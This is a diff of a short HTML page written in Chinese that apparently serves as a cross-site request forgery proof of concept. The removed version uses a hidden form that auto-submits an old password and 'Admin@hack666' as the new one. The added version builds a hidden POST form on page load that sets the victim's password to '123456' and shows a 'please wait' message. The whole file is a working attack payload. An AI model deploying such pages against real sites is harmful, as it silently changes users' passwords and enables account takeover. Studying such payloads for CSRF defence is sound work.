@@ -1,15 +1,25 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>密码修改</title>
+</head>
 <body>
-<form action="/change_password" method="post">
-    <input type="hidden" name="oldpwd" value="123456">
-    <input type="hidden" name="newpwd" value="Admin@hack666">
-    <input type="hidden" name="repwd" value="Admin@hack666">
-</form>
-<script>
-setTimeout(()=>{
-    document.forms[0].submit();
-},300);
-</script>
+    <script>
+        window.onload = function() {
+            const url = '/change_password';
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = url;
+            form.style.display = 'none';
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'new_password';
+            input.value = '123456';
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+    <p>正在提交密码修改请求，请稍候...</p>
 </body>
 </html>
